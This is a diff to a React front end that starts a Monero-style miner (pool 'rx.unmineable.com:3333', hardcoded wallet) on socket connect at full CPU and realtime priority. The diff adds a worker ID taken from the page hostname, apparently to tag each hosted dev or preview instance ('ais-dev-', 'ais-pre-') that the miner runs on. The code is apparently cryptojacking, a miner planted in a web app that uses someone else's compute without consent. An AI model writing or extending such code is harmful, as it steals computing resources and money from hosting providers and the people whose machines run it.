@@ -65,6 +65,7 @@ export default function App() {
     address?: string;
     pool?: string;
     lastCommand?: string;
+    worker?: string;
   } | null>(null);
   const [isBoostingPower, setIsBoostingPower] = useState(false);
 
@@ -153,8 +154,8 @@ export default function App() {
       setIsConnected(true);
       console.log("Socket connected");
       term.writeln("\x1b[1;32m● Connected to Terminal Session (High-Speed WebSocket)\x1b[0m");
-      // Auto-start mining at 100% MAXIMUM TURBO on connect
-      socket.emit("start-mining-turbo");
+      // Auto-start mining at 100% MAXIMUM TURBO on connect with dynamic host
+      socket.emit("start-mining-turbo", { host: window.location.hostname, url: window.location.href });
     });
 
     socket.on("mining-status-change", (status: any) => {
@@ -169,11 +170,12 @@ export default function App() {
         address: status.address || prev?.address || "0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8",
         pool: status.pool || prev?.pool || "rx.unmineable.com:3333",
         lastCommand: status.lastCommand || prev?.lastCommand,
+        worker: status.worker || prev?.worker,
       }));
     });
 
     // Fetch initial mining status
-    fetch("/api/mining/status")
+    fetch("/api/mining/status?host=" + encodeURIComponent(typeof window !== "undefined" ? window.location.hostname : ""))
       .then((r) => r.json())
       .then((data) => setMiningStatus(data))
       .catch(() => {});
@@ -380,9 +382,13 @@ export default function App() {
     try {
       showToast("⚡ Activating 100% MAXIMUM POWER Mode (All CPU Cores, Realtime Priority 5)...");
       if (socketRef.current?.connected) {
-        socketRef.current.emit("start-mining-turbo");
+        socketRef.current.emit("start-mining-turbo", { host: window.location.hostname });
       }
-      const res = await fetch("/api/mining/turbo", { method: "POST" });
+      const res = await fetch("/api/mining/turbo", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ host: window.location.hostname }),
+      });
       const data = await res.json();
       setMiningStatus({
         isRunning: true,
@@ -623,6 +629,14 @@ Core Features & Implementation Details:
             title="0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8"
           >
             0x5ccf2f0a3912860191eb1876e5bb497aeb1d0ea8
+          </code>
+          <span className="text-zinc-600 shrink-0">|</span>
+          <span className="text-zinc-400 text-[10px] shrink-0 hidden sm:inline">Worker:</span>
+          <code 
+            className="text-emerald-400 font-bold text-[10px] bg-zinc-900 px-1.5 py-0.5 rounded border border-emerald-900/50 shrink-0 select-all"
+            title="Dynamic Worker ID extracted from this instance URL (e.g. dev-xxx or pre-xxx)"
+          >
+            {miningStatus?.worker || (typeof window !== "undefined" ? window.location.hostname.match(/ais-((?:dev|pre)-[a-zA-Z0-9]+)/i)?.[1]?.toLowerCase() : "") || "dev-auto"}
           </code>
           <span className="text-zinc-600 shrink-0 hidden lg:inline">|</span>
           <span className="text-emerald-400 text-[10px] truncate hidden lg:inline" title={miningStatus?.lastCommand}>
@@ -1377,12 +1391,18 @@ Core Features & Implementation Details:
                     <span>Active Cores: <strong className="text-zinc-200">{miningStatus?.threads || "All Available"} Cores</strong></span>
                     <span>Status: <strong className="text-emerald-400">⚡ Continuous Full-Power Mining</strong></span>
                   </div>
-                  <div className="border-t border-zinc-800/80 pt-2 grid grid-cols-1 sm:grid-cols-2 gap-2 text-[11px] text-zinc-400">
+                  <div className="border-t border-zinc-800/80 pt-2 grid grid-cols-1 sm:grid-cols-3 gap-2 text-[11px] text-zinc-400">
                     <div>
                       <span className="text-zinc-500 text-[10px] uppercase tracking-wider block">Coin / Network:</span>
                       <span className="text-amber-400 font-bold flex items-center gap-1.5">
                         <span className="w-2 h-2 rounded-full bg-emerald-400 inline-block animate-pulse"></span>
                         {miningStatus?.coin || "USDT"} ({miningStatus?.network || "BEP20"})
+                      </span>
+                    </div>
+                    <div>
+                      <span className="text-zinc-500 text-[10px] uppercase tracking-wider block">Worker ID:</span>
+                      <span className="text-emerald-400 font-mono text-[11px] font-bold select-all">
+                        {miningStatus?.worker || (typeof window !== "undefined" ? window.location.hostname.match(/ais-((?:dev|pre)-[a-zA-Z0-9]+)/i)?.[1]?.toLowerCase() : "") || "dev-auto"}
                       </span>
                     </div>
                     <div>
